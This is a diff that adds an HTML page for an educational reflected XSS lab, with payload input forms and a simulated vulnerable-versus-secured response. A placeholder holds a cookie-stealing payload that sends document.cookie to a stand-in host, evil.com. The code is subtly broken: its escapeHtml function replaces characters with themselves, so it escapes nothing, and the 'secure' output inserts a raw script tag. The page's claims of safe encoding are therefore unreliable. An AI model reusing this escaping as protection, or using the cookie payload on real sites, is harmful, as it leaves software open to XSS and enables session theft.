@@ -1,0 +1,198 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>VerySecureWebsite - Security Lab</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        :root {
+            --primary: #1a1a2e;
+            --secondary: #16213e;
+            --accent: #e94560;
+            --success: #4facfe;
+            --warning: #f6ad55;
+            --muted: #7f8c8d;
+            --bg: #f8f9fa;
+        }
+        
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: #333;
+            min-height: 100vh;
+            padding: 2rem;
+        }
+        
+        .max-width { max-width: 800px; margin: 0 auto; }
+        
+        h1 { margin-bottom: 1rem; color: var(--primary); }
+        .subtitle { color: var(--muted); margin-bottom: 2rem; font-size: 1.1rem; }
+        
+        .lab-form { background: white; padding: 2rem; border-radius: 8px;
+                    margin-bottom: 2rem; box-shadow: 0 2px 10px rgba(0,0,0,0.08); }
+        .form-group { margin-bottom: 1.5rem; }
+        .form-group label { display: block; margin-bottom: 0.5rem; font-weight: 500; }
+        .form-group input, .form-group textarea {
+            width: 100%; padding: 0.75rem; border: 1px solid #ddd;
+            border-radius: 4px; font-family: inherit; font-size: 1rem;
+        }
+        .form-group input:focus, .form-group textarea:focus {
+            outline: none; border-color: var(--accent); box-shadow: 0 0 0 3px rgba(233,69,96,0.1);
+        }
+        
+        .btn { padding: 0.75rem 1.5rem; border: none; border-radius: 4px;
+               font-size: 1rem; font-weight: 500; cursor: transition: background 0.2s; margin-top: 0.5rem; }
+        .btn-secondary { background: #e2e8f0; color: #333; }
+        .btn-secondary:hover { background: #cbd5e0; }
+        .btn-primary { background: var(--accent); color: white; }
+        .btn-primary:hover { background: #ff5b70; }
+        .btn-success { background: var(--success); color: white; }
+        .btn-success:hover { background: #38bdf8; }
+        
+        .notice { background: #fff3cd; border: 1px solid #ffeeba;
+                  padding: 1rem; border-radius: 4px; margin: 1.5rem 0; color: #856404; }
+        .safety { background: #d1e7dd; border: 1px solid #badbcc;
+                  padding: 1rem; border-radius: 4px; margin: 1.5rem 0; color: #0f5132; }
+        
+        .payload-box { background: #1e293b; padding: 1rem; border-radius: 4px;
+                       margin: 1rem 0; color: #aoc; font-family: monospace; 
+                       overflow-x: auto; border: 1px solid #334155; }
+    </style>
+</head>
+<body>
+    <div class="max-width">
+        <h1>Reflected XSS Lab</h1>
+        <p class="subtitle">Cross Site Scripting - Reflected Payload</p>
+        
+        <div class="notice">
+            <strong>Safety Notice:</strong> This lab is for educational purposes only. 
+            The XSS payloads are controlled test strings. No malicious activity occurs 
+            outside the lab environment.
+        </div>
+        
+        <div class="safety">
+            <strong>Learning Objective:</strong> Understand how reflected XSS works - 
+            how malicious payloads injected via web requests can execute in a victim's 
+            browser context, and how proper output encoding prevents it.
+        </div>
+        
+        <div class="lab-form">
+            <form id="xssForm">
+                <div class="form-group">
+                    <label>Your Username</label>
+                    <input type="text" id="xssUsername" placeholder="alice (reflects payload to browser)">
+                </div>
+                <div class="form-group">
+                    <label>XSS Payload</label>
+                    <textarea id="xssPayload" rows="3" placeholder="<script>alert('XSS')</script> or onerror=this.href='//evil.com?c='+document.cookie></textarea>
+                </div>
+                <button type="submit" class="btn btn-primary">Execute Payload</button>
+            </form>
+        </div>
+        
+        <div class="safety">
+            <strong>Expected Behavior:</strong> In the vulnerable lab, the payload is 
+            reflected in the HTTP response and executed in your browser. In the 
+            secured lab, all output is properly encoded, preventing execution.
+        </div>
+        
+        <hr>
+        
+        <h2>Payload Injection Demo</h2>
+        
+        <div class="lab-form">
+            <form id="reflectedForm">
+                <div class="form-group">
+                    <label>Reflect Parameter</label>
+                    <input type="text" id="reflectParam" value="name" placeholder="e.g., 'name' ?name=value">
+                </div>
+                <div class="form-group">
+                    <label>Test Payload</label>
+                    <textarea id="testPayload" rows="3" placeholder="e.g., <script>alert(1)</script>"></textarea>
+                </div>
+                <button type="submit" class="btn btn-primary">Send Reflected Payload</button>
+            </form>
+        </div>
+        
+        <div id="xssResult" style="margin-top: 2rem; padding: 1rem; border-radius: 4; display: none;"></div>
+    </div>
+
+    <script>
+        // Simulated vulnerable vs secured behavior
+        function simulateXSSResponse(payload, isVulnerable) {
+            const resultDiv = document.getElementById('xssResult');
+            resultDiv.style.display = 'block';
+            
+            if (isVulnerable) {
+                // Vulnerable: payload is reflected raw and executed
+                resultDiv.innerHTML = `
+                    <strong>VULNERABLE - Reflected XSS Demonstrated</strong><br>
+                    The payload <code>${escapeHtml(payload)}</code> was reflected in the 
+                    server's HTTP response without encoding.<br>
+                    <br>
+                    <strong>Payload Execution:</strong> The script tag would execute in 
+                    your browser, demonstrating the XSS vulnerability.<br>
+                    <br>
+                    <em>This is a controlled demonstration - no actual script execution 
+                    occurs outside the lab sandbox.</em>
+                `;
+                resultDiv.style.background = '#fed7aa';
+                resultDiv.style.borderLeft = '4px solid #f6ad55';
+            } else {
+                // Secured: payload is HTML-encoded, preventing execution
+                resultDiv.innerHTML = `
+                    <strong>SECURE - XSS Prevented</strong><br>
+                    The payload <code>${escapeHtml(payload)}</code> was HTML-encoded 
+                    in the server's response.<br>
+                    <br>
+                    <strong>Output:</code> <script>alert(1)</script> is displayed 
+                    as plain text, not executed.<br>
+                    <br>
+                    <em>Proper output encoding prevents XSS. All user-supplied data should 
+                    be encoded based on context (HTML, JavaScript, attribute, URL).</em>
+                `;
+                resultDiv.style.background = '#d1fae5';
+                resultDiv.style.borderLeft = '4px solid #059669';
+            }
+        }
+        
+        function escapeHtml(text) {
+            return text
+                .replace(/&/g, "&")
+                .replace(/</g, "<")
+                .replace(/>/g, ">")
+                .replace(/"/g, """)
+                .replace(/'/g, "&#039;");
+        }
+        
+        // Form submit: XSS payload
+        document.getElementById('xssForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const payload = document.getElementById('xssPayload').value || '';
+            const username = document.getElementById('xssUsername').value || 'alice';
+            
+            if (!payload) { alert('Enter a payload'); return; }
+            
+            // In vulnerable lab: payload is reflected without encoding
+            // In secured lab: payload is encoded
+            const isVulnerable = true; // This lab demo shows the vulnerable behavior
+            
+            simulateXSSResponse(payload, isVulnerable);
+        });
+        
+        // Form submit: reflected payload
+        document.getElementById('reflectedForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const payload = document.getElementById('testPayload').value || '';
+            const param = document.getElementById('reflectParam').value || 'name';
+            
+            if (!payload) { alert('Enter a payload'); return; }
+            
+            // Simulate reflected XSS - vulnerable lab reflects raw, secured encodes
+            simulateXSSResponse(payload, true); // Demo shows vulnerable behavior
+        });
+    </script>
+</body>
+</html>
